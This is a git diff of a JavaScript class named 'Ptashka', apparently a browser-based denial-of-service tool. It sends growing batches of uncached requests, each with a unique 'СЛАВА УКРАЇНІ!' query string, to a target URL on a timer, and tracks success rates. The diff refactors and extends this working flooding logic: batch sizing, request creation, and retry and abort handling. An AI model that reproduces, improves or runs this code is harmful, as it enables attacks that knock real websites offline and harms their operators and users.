@@ -1,3 +1,5 @@
+import { v4 as generateUUID } from 'uuid';
+
 import { setCustomInterval } from '../helpers.js';
 import {
   PTASHKA_STATUS_READY,
@@ -14,7 +16,8 @@ import {
 */
 
 // CONSTANTS
-const INTERVAL_PERIOD = 5000; // 5 sec
+const INITIAL_DELAY = 10000; // 10 sec
+const INTERVAL_DELAY = 5000; // 5 sec
 
 // depending on the batch resize direction, increase or decrease
 // the batch size by multiplying the breakpoint by the factor
@@ -40,14 +43,18 @@ class Ptashka extends EventTarget {
 
   url = '';
   status = PTASHKA_STATUS_READY;
-  sent = 0;
-  interval = null;
+  requestsSent = 0;
+  requestsSucceed = 0;
+  requestsFailed = 0;
+  successRate = 0; // from 0 to 100
+  timer = null;
   startedAt = new Date().toISOString();
   pausedAt = null;
 
   batchSizeDirection = BATCH_SIZE_DIRECTION_GROW;
   batchSizeBreakpoint = 64;
-  batchSize = 1; // number of ptashka to send at the interval
+  batchSize = 1; // number of ptashka to send at the timer
+  batchesSent = 0;
 
   controller = new AbortController();
 
@@ -66,41 +73,67 @@ class Ptashka extends EventTarget {
 
     this.#setStatusRunning();
 
-    const sendRequests = async () => {
-      let batch = [];
+    const createRequest = () => {
+      const requestOptions = {
+        mode: 'no-cors',
+        credentials: 'include',
+        cache: 'no-store',
+        headers: {
+          Authorization:
+            'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
+          'Cache-Control': 'no-store',
+        },
+        referrerPolicy: 'no-referrer',
+        signal: this.controller.signal,
+      };
+
+      const uniqueId = generateUUID();
+
+      const searchParamsKey = uniqueId;
+      const searchParamsValue = `СЛАВА УКРАЇНІ! ${uniqueId}`;
+
+      const requestUrl = new URL(this.url);
+
+      requestUrl.searchParams.append(searchParamsKey, searchParamsValue);
+
+      const request = new Request(requestUrl, requestOptions);
+
+      return request;
+    };
+
+    const sendRequest = async (request) => {
+      this.#setRequestsSent((requestsSent) => requestsSent + 1);
+
+      try {
+        const response = await fetch(request);
+
+        // TODO: follow a redirect hence modify and resend the request
+
+        this.#incrementRequestsSucceed();
+
+        return response;
+      } catch (error) {
+        const isAborted = error?.name && error.name === 'AbortError';
+
+        if (!isAborted) {
+          this.#incrementRequestsFailed();
+        }
+
+        return error;
+      }
+    };
+
+    const createBatch = () => {
+      const batch = [];
 
       let counter = 0;
       for (counter; counter < this.batchSize; counter += 1) {
-        const request = this.#createRequest();
+        const request = createRequest();
 
         batch.push(request);
       }
 
-      const responses = await Promise.allSettled(
-        batch.map(async (request) => {
-          const response = await fetch(request);
-
-          return response;
-        })
-      );
-
-      const isAnyRequestAborted = responses.some((response) => {
-        const isResponseRejected = response?.reason && response.reason?.name;
-
-        if (isResponseRejected) {
-          return response.reason.name === 'AbortError';
-        }
-
-        return false;
-      });
-
-      if (isAnyRequestAborted) {
-        return;
-      }
-
-      this.#setSent(this.sent + this.batchSize);
-
-      const isBreakpointReached = this.#isBatchSizeDirectionIncreasing
+      const isBreakpointReached = this.#isBatchSizeDirectionGrowing
         ? this.batchSize >= this.batchSizeBreakpoint
         : this.batchSize <= this.batchSizeBreakpoint;
 
@@ -144,25 +177,59 @@ class Ptashka extends EventTarget {
         this.batchSizeBreakpoint = nextBreakpoint;
       }
 
-      // TODO: refactor as a separate function
-      this.batchSize +=
-        this.batchSizeDirection *
-        (this.batchSizeBreakpoint * BATCH_STEP_FACTOR);
+      this.#adjustBatchSize();
+
+      return batch;
     };
 
-    // TODO: use setTimeout if successful, otherwise retry 5 times and abort
+    const sendBatch = async (batch) => {
+      Promise.allSettled(
+        batch.map((request) => {
+          sendRequest(request);
+        })
+      ).then(() => {
+        this.#calculateSuccessRate();
+      });
 
-    this.interval = setCustomInterval(sendRequests, INTERVAL_PERIOD, true);
+      // NOTE: temporary disabled since unnecessary
+      // const isAnyRequestAborted = responses.some((response) => {
+      // const isResponseRejected = response?.reason && response.reason?.name;
 
-    // const retrySendRequests = async () => {
+      // if (isResponseRejected) {
+      //   return response.reason.name === 'AbortError';
+      // }
 
-    // };
+      //   return false;
+      // });
 
-    // try {
-    //   const response = await sendRequests();
-    // } catch {
+      // if (isAnyRequestAborted) {
+      //   return;
+      // }
 
-    // }
+      this.#incrementBatchesSent();
+    };
+
+    // start with a single request
+    const initialRequest = createRequest();
+    sendRequest(initialRequest);
+
+    // start a timer with an initial delay before the start of
+    // the interval with its own delay
+    const initialTimer = setTimeout(() => {
+      // iteratively create a new batch of requests and send them with a delay
+      const timer = setCustomInterval(
+        () => {
+          const batch = createBatch();
+          sendBatch(batch);
+        },
+        INTERVAL_DELAY,
+        true
+      );
+
+      this.#setTimer(timer);
+    }, INITIAL_DELAY);
+
+    this.#setTimer(initialTimer);
   }
 
   async pause() {
@@ -175,9 +242,10 @@ class Ptashka extends EventTarget {
     this.#setStatusPaused();
 
     // abort the fetch requests
-    this.#reconstructController();
+    this.#restartController();
 
-    this.#resetInterval();
+    // stop sending requests
+    this.#resetTimer();
   }
 
   async resume() {
@@ -190,42 +258,20 @@ class Ptashka extends EventTarget {
     await this.send();
   }
 
-  #dispatchChange(change) {
-    const event = new CustomEvent('change', { detail: change });
-
-    this.dispatchEvent(event);
-
-    const isOnChangeDefined = this.onchange !== undefined;
-    if (isOnChangeDefined) {
-      this.onchange(change);
-    }
-  }
-
-  #watchPropChange(prop, setter) {
-    return (value) => {
-      const change = {
-        key: prop,
-        value,
-      };
-
-      const result = setter(value);
-
-      this.#dispatchChange(change);
-
-      return result;
-    };
-  }
-
   toJSON() {
     const serialized = {
       url: this.url,
-      sent: this.sent,
+      requestsSent: this.requestsSent,
+      requestsSucceed: this.requestsSucceed,
+      requestsFailed: this.requestsFailed,
+      successRate: this.successRate,
       status: this.status,
       startedAt: this.startedAt,
       pausedAt: this.pausedAt,
       batchSizeDirection: this.batchSizeDirection,
       batchSizeBreakpoint: this.batchSizeBreakpoint,
       batchSize: this.batchSize,
+      batchesSent: this.batchesSent,
     };
 
     return serialized;
@@ -240,11 +286,12 @@ class Ptashka extends EventTarget {
     return this.status === PTASHKA_STATUS_PAUSED;
   }
 
-  get #isBatchSizeDirectionIncreasing() {
+  get #isBatchSizeDirectionGrowing() {
     return this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW;
   }
 
   // SETTERS
+  // NOTE: *always* change props using the setters
   #setStatus = this.#watchPropChange('status', (value) => {
     const currentDateISO = new Date().toISOString();
 
@@ -263,23 +310,61 @@ class Ptashka extends EventTarget {
     this.#setStatus(PTASHKA_STATUS_PAUSED);
   }
 
-  #setSent = this.#watchPropChange('sent', (value) => {
-    this.sent = value;
+  // TODO: wrap with a throttle
+  #setRequestsSent = this.#watchPropChange('requestsSent', (value) => {
+    this.requestsSent = value;
   });
 
-  #setStartedAt = this.#watchPropChange('startedAt', (value) => {
-    this.startedAt = value;
+  #setRequestsSucceed(value) {
+    this.requestsSucceed = value;
+  }
+
+  #setRequestsFailed(value) {
+    this.requestsFailed = value;
+  }
+
+  #setSuccessRate = this.#watchPropChange('successRate', (value) => {
+    this.successRate = value;
   });
 
   #setPausedAt = this.#watchPropChange('pausedAt', (value) => {
     this.pausedAt = value;
   });
 
-  #setInterval(value) {
-    this.interval = value;
+  #setTimer(value) {
+    this.timer = value;
   }
 
+  #setBatchesSent = this.#watchPropChange('batchesSent', (value) => {
+    this.batchesSent = value;
+  });
+
   // HELPERS
+  #incrementBatchesSent() {
+    this.#setBatchesSent((batchesSent) => batchesSent + 1);
+  }
+
+  #incrementRequestsFailed() {
+    // TODO: refactor to make all setters accept a function as a value
+    this.#setRequestsFailed(this.requestsFailed + 1);
+  }
+
+  #incrementRequestsSucceed() {
+    this.#setRequestsSucceed(this.requestsSucceed + 1);
+  }
+
+  #calculateSuccessRate() {
+    const successRate = Math.round(
+      (this.requestsSucceed / this.requestsSent) * 100
+    );
+
+    const isSuccessRateValid = Number.isInteger(successRate);
+
+    if (isSuccessRateValid) {
+      this.#setSuccessRate(successRate);
+    }
+  }
+
   #reverseDirection() {
     this.batchSizeDirection =
       this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW
@@ -287,40 +372,56 @@ class Ptashka extends EventTarget {
         : BATCH_SIZE_DIRECTION_GROW;
   }
 
-  #createRequest() {
-    const requestOptions = {
-      mode: 'no-cors',
-      credentials: 'include',
-      cache: 'no-store',
-      headers: {
-        Authorization:
-          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
-      },
-      signal: this.controller.signal,
-    };
-
-    const searchParamsKey = Date.now();
-    const searchParamsValue = `СЛАВА УКРАЇНІ! ${Date.now()}`;
-
-    const requestUrl = new URL(this.url);
-
-    requestUrl.searchParams.append(searchParamsKey, searchParamsValue);
-
-    const request = new Request(requestUrl, requestOptions);
-
-    return request;
+  #adjustBatchSize() {
+    this.batchSize +=
+      this.batchSizeDirection * (this.batchSizeBreakpoint * BATCH_STEP_FACTOR);
   }
 
-  #reconstructController() {
+  #restartController() {
     this.controller.abort();
 
     this.controller = new AbortController();
   }
 
-  #resetInterval() {
-    clearInterval(this.interval);
+  #resetTimer() {
+    clearInterval(this.timer);
 
-    this.#setInterval(null);
+    this.#setTimer(null);
+  }
+
+  #dispatchChange(change) {
+    const event = new CustomEvent('change', { detail: change });
+
+    this.dispatchEvent(event);
+
+    const isOnChangeDefined = this.onchange !== undefined;
+    if (isOnChangeDefined) {
+      this.onchange(change);
+    }
+  }
+
+  #watchPropChange(prop, setter) {
+    return (value) => {
+      let nextValue = value;
+      const prevValue = this[prop];
+
+      const isValueFunc = typeof value === 'function';
+
+      if (isValueFunc) {
+        nextValue = value(prevValue);
+      }
+
+      const change = {
+        key: prop,
+        value: nextValue,
+      };
+
+      const result = setter(nextValue);
+
+      this.#dispatchChange(change);
+
+      return result;
+    };
   }
 }
 
